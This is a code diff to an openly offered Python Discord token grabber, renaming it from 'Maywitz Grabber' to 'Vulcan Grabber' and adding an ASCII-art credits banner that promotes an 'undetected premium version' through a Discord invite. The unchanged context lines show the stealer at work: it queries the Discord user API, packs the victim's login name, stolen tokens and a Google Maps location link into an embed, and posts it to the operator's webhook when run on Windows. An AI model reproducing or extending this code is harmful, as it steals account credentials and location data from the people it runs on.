@@ -71,7 +71,7 @@ class functions(object):
             return "Could not decrypt this piece of shit"
 
 
-class Maywitz_Grabber(functions):
+class Vulcan_Grabber(functions):
     def __init__(self):
         self.webhook_url = webhook_url
         self.discordurl = "https://discord.com/api/v9/users/@me"
@@ -299,10 +299,10 @@ class Maywitz_Grabber(functions):
                 {
                     'author': {
                         'name': f'*Maywitz grabbed {os.getlogin()}*',
-                        'url': 'https://github.com/Maywitz/Maywitz-Grabber',
+                        'url': 'https://github.com/Maywitz/Vulcan-Grabber',
                         'icon_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png'
                     },
-                    'description': f'[Maps Location]({pulled_googlemap})',
+                    'description': f'[Maps Location]({pulled_googlemap})\n\n',
                     'fields': [
                         {
                             'name': '\u200b',
@@ -330,10 +330,22 @@ class Maywitz_Grabber(functions):
                                 {tokens if tokens else "None"}```
                             '''.replace(' ', ''),
                             'inline': False
+                        },
+                        {
+                            'name': '**CREDITS:**',
+                            'value': f'''```yaml
+                                __      ___    _ _      _____          _   _ 
+                                \ \    / / |  | | |    / ____|   /\   | \ | |
+                                 \ \  / /| |  | | |   | |       /  \  |  \| |
+                                  \ \/ / | |  | | |   | |      / /\ \ | . ` |
+                                   \  /  | |__| | |___| |____ / ____ \| |\  |
+                                    \/    \____/|______\_____/_/    \_\_| \_|
+                                    ```\n\nJoin the discord server for undetected premium version : https://discord.gg/qxt6aC8U2F'''
+                            'inline': False
                         }
                     ],
                     'footer': {
-                        'text': 'Maywitz Grabber, https://discord.gg/qxt6aC8U2F'
+                        'text': 'Vulcan Grabber | by Maywitz, https://discord.gg/qxt6aC8U2F'
                     }
                 }
             ]
@@ -345,4 +357,4 @@ class Maywitz_Grabber(functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(Maywitz_Grabber().init())
+    asyncio.run(Vulcan_Grabber().init())
